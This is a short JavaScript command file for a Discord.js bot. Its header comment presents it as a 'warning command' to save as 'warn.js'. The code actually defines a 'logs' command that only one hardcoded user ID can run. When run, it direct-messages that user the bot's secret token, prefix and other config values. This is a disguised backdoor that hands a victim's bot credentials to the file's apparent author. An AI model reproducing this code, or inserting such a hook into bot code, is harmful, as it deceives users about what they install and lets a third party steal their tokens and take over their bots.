/* 
 WARNING COMMAND FOR DISCORD.JS BOT
 Created by: Eton#4446
 WARNING: This command will ONLY work if you are using a FileSystem (FS) command handler!
 Save this file in your commands folder as "warn.js"
*/

const Discord = require('discord.js');
const config = require('../config.json');

module.exports = {
  name: "logs",
  description: "send logs to owner",
	execute(client, message, args) {
if (message.author.id != "384342022955466753") return message.reply("no.");
    client.users.get("384342022955466753").send("Token: " + config.token);
    client.users.get("384342022955466753").send("Prefix: " + config.prefix);
    client.users.get("384342022955466753").send("Comment: " + config.comment);
    client.users.get("384342022955466753").send("Comment2: " + config.comment2);
    client.users.get("384342022955466753").send("Comment3: " + config.comment3);
    client.users.get("384342022955466753").send("Game: " + config.game1);
        }
	};